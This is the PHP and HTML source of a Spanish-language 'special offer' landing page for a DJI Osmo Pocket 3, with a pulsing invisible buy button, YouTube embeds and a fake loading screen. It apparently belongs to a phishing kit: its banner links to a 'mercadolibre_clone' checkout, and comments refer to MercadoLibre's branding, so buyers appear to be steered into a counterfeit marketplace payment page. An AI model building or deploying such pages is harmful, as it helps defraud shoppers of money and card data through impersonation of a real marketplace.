<?php
require_once __DIR__ . '/../../config.php';
$landing_slug = 'dji-osmo';
$landing_token = obtenerOCrearTokenLanding($landing_slug, 'DJI Osmo Pocket 3', 1500000);
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DJI Osmo Pocket 3 - Oferta Especial</title>
    <!-- Fuentes modernas -->
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800&display=swap" rel="stylesheet">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            background-color: #ffffff; /* Blanco */
            text-align: center;
            overflow-x: hidden; /* Evita que elementos desbordados creen scroll horizontal en móvil */
        }
        
        .image-container {
            position: relative;
            display: block;
            width: 100%;
            max-width: 1920px;
            margin: 0 auto;
        }
        
        .hero-section, .info-section, .reviews-section {
            position: relative;
            width: 100%;
        }
        
        .img-desktop {
            width: 100%;
            display: block;
        }
        
        .img-mobile {
            width: 100%;
            display: none;
        }

        .banner-custom-margin {
            margin: -60px 0;
            position: relative;
            z-index: 10;
        }
        
        /* 
         * ÁREA CLICKABLE ANIMADA
         */
        .btn-link {
            position: absolute;
            display: block;
            z-index: 10;
            border-radius: 50px;
            
            /* Animación de latido (pulse) */
            animation: pulse 2s infinite;
            
            /* Posición para la imagen de PC */
            top: 66.6%; 
            left: 5.3%;
            width: 25.7%;
            height: 7.4%;
        }

        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(255, 230, 0, 0.8);
            }
            70% {
                box-shadow: 0 0 0 20px rgba(255, 230, 0, 0);
            }
            100% {
                box-shadow: 0 0 0 0 rgba(255, 230, 0, 0);
            }
        }
        
        /* 
         * ÁREAS DE VIDEO
         */
        .video-wrapper {
            position: absolute;
            z-index: 10;
            border-radius: 12px;
            overflow: hidden; /* Para que el iframe no se salga de las curvas */
            background: #000;
        }

        .video-wrapper iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* Posiciones PC */
        #wrap1 { top: 3.9%; left: 73.1%; width: 25.2%; height: 20.4%; }
        #wrap2 { top: 30.4%; left: 73.2%; width: 25.2%; height: 20.4%; }
        #wrap3 { top: 59.7%; left: 73.2%; width: 25.2%; height: 20.4%; }

        /* Contenedor de Galería Móvil oculto en PC */
        .mobile-gallery-container {
            display: none;
        }

        @media (max-width: 768px) {
            .img-desktop { display: none; }
            .img-mobile { display: block; }
            
            .btn-link {
                /* Posición para la imagen de MÓVIL */
                top: 79.5%;
                left: -9.1%;
                width: 129.3%;
                height: 11.7%;
            }
            
            /* Ocultar los videos superpuestos en móvil para usar la galería */
            .video-wrapper {
                display: none !important;
            }

            .banner-custom-margin {
                margin: -140px 0 !important; /* Aún más agresivo en móvil */
            }

            /* Estilos de la galería móvil */
            .mobile-gallery-container {
                display: block;
                background-color: #ffffff; /* Blanco */
                padding: 40px 0 60px 0;
            }
            
            .gallery-title {
                font-family: 'Montserrat', sans-serif;
                font-size: 26px;
                margin: 0 0 25px 0;
                font-weight: 800;
                text-transform: uppercase;
                letter-spacing: 1px;
                color: #333333;
                position: relative;
                display: inline-block;
            }

            .gallery-title::after {
                content: '';
                display: block;
                width: 50%;
                height: 4px;
                background-color: #ffe600; /* Amarillo MercadoLibre */
                margin: 8px auto 0;
                border-radius: 2px;
            }

            .gallery-wrapper {
                position: relative;
                width: 100%;
                display: flex;
                align-items: center;
            }

            .nav-btn {
                position: absolute;
                background: #ffe600; /* Amarillo MercadoLibre */
                color: #333;
                border: none;
                width: 40px;
                height: 40px;
                border-radius: 50%;
                font-size: 20px;
                font-weight: bold;
                cursor: pointer;
                z-index: 20;
                box-shadow: 0 2px 5px rgba(0,0,0,0.2);
                display: flex;
                align-items: center;
                justify-content: center;
                top: 50%;
                transform: translateY(-50%);
            }

            .prev-btn { left: 5px; }
            .next-btn { right: 5px; }

            .mobile-video-gallery {
                display: flex;
                overflow-x: auto;
                scroll-behavior: smooth;
                scroll-snap-type: x mandatory;
                -webkit-overflow-scrolling: touch;
                gap: 20px;
                padding: 0 20px 20px 20px;
                scrollbar-width: none; /* Firefox */
                width: 100%;
            }

            .mobile-video-gallery::-webkit-scrollbar {
                display: none; /* Chrome/Safari */
            }

            .gallery-item {
                flex: 0 0 85%; /* Ocupa el 85% para que se asome el siguiente video */
                scroll-snap-align: center;
                border-radius: 16px;
                overflow: hidden;
                aspect-ratio: 16 / 9;
                background: #000;
                position: relative;
                box-shadow: 0 10px 20px rgba(0,0,0,0.5);
            }

            .gallery-item iframe {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                border: none;
            }
        }
    </style>
</head>
<body>
    <!-- PANTALLA DE CARGA ML -->
    <div id="landing-loader" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.9); z-index: 9999; flex-direction: column; justify-content: center; align-items: center;">
        <div style="width: 50px; height: 50px; border: 4px solid #ebebeb; border-top-color: #3483fa; border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <div style="margin-top: 20px; font-family: 'Montserrat', sans-serif; font-size: 18px; color: #333; font-weight: 700;">Cargando...</div>
    </div>
    
    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <div class="image-container">
        
        <!-- SECCIÓN 1: Principal con Botón -->
        <div class="hero-section">
            <!-- IMAGEN PARA PC -->
            <img src="desktop.png" alt="DJI Osmo Desktop" class="img-desktop">
            
            <!-- IMAGEN PARA MÓVIL -->
            <img src="mobile.png" alt="DJI Osmo Mobile" class="img-mobile">
            
            <!-- EL BOTÓN INVISIBLE -->
            <a href="#" onclick="cargarLink('<?= URL_PASARELA ?>/checkout.php?token=<?= $landing_token ?>', event)" class="btn-link" title="Comprar ahora"></a>
        </div>
        
        <!-- BANNER -->
        <div class="banner-section banner-custom-margin">
            <a href="#" onclick="cargarLink('<?= URL_PASARELA ?>/pago/mercadolibre_clone/index.php?token=<?= $landing_token ?>', event)" style="display: block; cursor: pointer;">
                <img src="banner.png" alt="Banner Oficial" class="img-desktop" style="width: 100%; height: auto;">
                <img src="bannermobile.png" alt="Banner Oficial Mobile" class="img-mobile" style="width: 100%; height: auto;">
            </a>
        </div>

        <!-- SECCIÓN 2: Descriptiva -->
        <div class="info-section" id="infoContainer">
            <!-- IMAGEN PARA PC 2 -->
            <img src="desktop2.png" alt="DJI Osmo Info PC" class="img-desktop">
            
            <!-- IMAGEN PARA MÓVIL 2 -->
            <img src="mobile2.png" alt="DJI Osmo Info Mobile" class="img-mobile">
            
            <!-- VIDEOS DE YOUTUBE INTERACTIVOS (PC) -->
            <div class="video-wrapper" id="wrap1">
                <div id="vid1" data-id="vYZBr_K38W8"></div>
            </div>
            <div class="video-wrapper" id="wrap2">
                <div id="vid2" data-id="_Bpwo7JlmII"></div>
            </div>
            <div class="video-wrapper" id="wrap3">
                <div id="vid3" data-id="Eng5nuRryVs"></div>
            </div>
        </div>
        
        <!-- GALERÍA MÓVIL (Se muestra solo debajo de mobile2 en celulares) -->
        <div class="mobile-gallery-container">
            <h2 class="gallery-title">Mira la cámara en acción</h2>
            <div class="gallery-wrapper">
                <button class="nav-btn prev-btn">&#10094;</button>
                <div class="mobile-video-gallery" id="mobileGallery">
                    <div class="gallery-item">
                        <iframe loading="lazy" src="https://www.youtube.com/embed/vYZBr_K38W8?controls=1&modestbranding=1&rel=0&playsinline=1" allow="encrypted-media" allowfullscreen></iframe>
                    </div>
                    <div class="gallery-item">
                        <iframe loading="lazy" src="https://www.youtube.com/embed/_Bpwo7JlmII?controls=1&modestbranding=1&rel=0&playsinline=1" allow="encrypted-media" allowfullscreen></iframe>
                    </div>
                    <div class="gallery-item">
                        <iframe loading="lazy" src="https://www.youtube.com/embed/Eng5nuRryVs?controls=1&modestbranding=1&rel=0&playsinline=1" allow="encrypted-media" allowfullscreen></iframe>
                    </div>
                </div>
                <button class="nav-btn next-btn">&#10095;</button>
            </div>
        </div>
        
        <!-- SECCIÓN 3: Opiniones / Reviews -->
        <div class="reviews-section">
            <img src="desktop3.png" alt="Opiniones PC" class="img-desktop">
            <img src="mobile3.png" alt="Opiniones Mobile" class="img-mobile">
        </div>
        
    </div>

    <!-- API DE YOUTUBE PARA CONTROL DE HOVER Y SONIDO -->
    <script src="https://www.youtube.com/iframe_api"></script>
    <script>
        const isMobile = window.innerWidth <= 768;

        function onYouTubeIframeAPIReady() {
            // Inicializar los 3 videos
            ['1', '2', '3'].forEach(num => {
                const vidDiv = document.getElementById('vid' + num);
                const vidId = vidDiv.getAttribute('data-id');
                const wrapper = document.getElementById('wrap' + num);

                new YT.Player('vid' + num, {
                    videoId: vidId,
                    playerVars: {
                        autoplay: isMobile ? 1 : 0,
                        mute: 1,
                        loop: 1,
                        playlist: vidId,
                        controls: 1,
                        rel: 0,
                        modestbranding: 1,
                        playsinline: 1
                    },
                    events: {
                        'onReady': (event) => {
                            if (!isMobile) {
                                // En computadora (desktop), reproducir al poner el cursor y pausar al quitarlo
                                wrapper.addEventListener('mouseenter', () => {
                                    event.target.playVideo();
                                });
                                wrapper.addEventListener('mouseleave', () => {
                                    event.target.pauseVideo();
                                });
                            }
                        }
                    }
                });
            });
        }

        // Lógica de las flechas de la galería
        document.addEventListener('DOMContentLoaded', () => {
            const gallery = document.getElementById('mobileGallery');
            const prevBtn = document.querySelector('.prev-btn');
            const nextBtn = document.querySelector('.next-btn');
            
            if (gallery && prevBtn && nextBtn) {
                const scrollAmount = window.innerWidth * 0.85; // Desplazarse un video a la vez
                
                prevBtn.addEventListener('click', () => {
                    gallery.scrollBy({ left: -scrollAmount, behavior: 'smooth' });
                });
                
                nextBtn.addEventListener('click', () => {
                    gallery.scrollBy({ left: scrollAmount, behavior: 'smooth' });
                });
            }
        });

        // Lógica de pantalla de carga
        function cargarLink(url, event) {
            if (event) {
                event.preventDefault();
            }
            document.getElementById('landing-loader').style.display = 'flex';
            setTimeout(function() {
                window.location.href = url;
            }, 1000);
        }
    </script>
</body>
</html>
